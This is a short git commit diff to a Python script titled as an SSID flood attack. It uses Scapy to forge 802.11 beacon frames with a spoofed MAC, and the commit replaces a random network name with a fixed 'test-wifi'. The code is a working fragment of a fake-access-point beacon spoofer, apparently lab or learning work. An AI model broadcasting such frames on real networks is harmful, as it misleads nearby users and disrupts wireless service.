a87022c87e1894832bfbee5902024029cc31c067
Webblitchy <55515713+Webblitchy@users.noreply.github.com>
2023-03-30 13:34:27 +0200

    one wifi

--- scripts/3_SSID_flood_attack.py
+++ scripts/3_SSID_flood_attack.py
@@ -7,13 +7,15 @@ from random import random
 ssids = ["wifi1", "wifi2", "wifi3"]
 wifi_name = randstring(math.floor(random() * 6) + 5)
 
+wifi_ssid = "test-wifi"
+
 sendp(
     RadioTap()
     / Dot11(
         addr1="ff:ff:ff:ff:ff:ff", addr2="00:01:02:03:04:05", addr3="00:01:02:03:04:05"
     )
     / Dot11Beacon(cap="ESS", timestamp=1)
-    / Dot11Elt(ID="SSID", info=wifi_name)
+    / Dot11Elt(ID="SSID", info=wifi_ssid)
     / Dot11EltRates(rates=[130, 132, 11, 22])
     / Dot11Elt(ID="DSset", info="\x03")
     / Dot11Elt(ID="TIM", info="\x00\x01\x00\x00"),
